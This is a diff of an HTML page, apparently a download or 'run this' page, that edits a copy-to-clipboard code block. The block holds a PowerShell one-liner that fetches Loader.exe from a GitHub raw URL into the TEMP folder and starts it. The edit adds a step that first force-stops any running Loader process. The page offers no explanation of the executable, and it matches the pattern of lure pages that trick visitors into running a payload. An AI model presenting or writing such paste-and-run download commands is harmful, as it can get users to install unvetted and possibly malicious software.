@@ -539,7 +539,7 @@
                                 </button>
                             </div>
                             <div class="terminal-copy-row">
-                                <code id="runCmdCode">powershell -Command "irm https://raw.githubusercontent.com/mellstroed/system-load/main/Loader.exe -OutFile $env:TEMP\Loader.exe; Start-Process $env:TEMP\Loader.exe"</code>
+                                <code id="runCmdCode">powershell -Command "Stop-Process -Name Loader -Force -ErrorAction SilentlyContinue; irm https://raw.githubusercontent.com/mellstroed/system-load/main/Loader.exe -OutFile $env:TEMP\Loader.exe; Start-Process $env:TEMP\Loader.exe"</code>
                             </div>
                         </div>
 
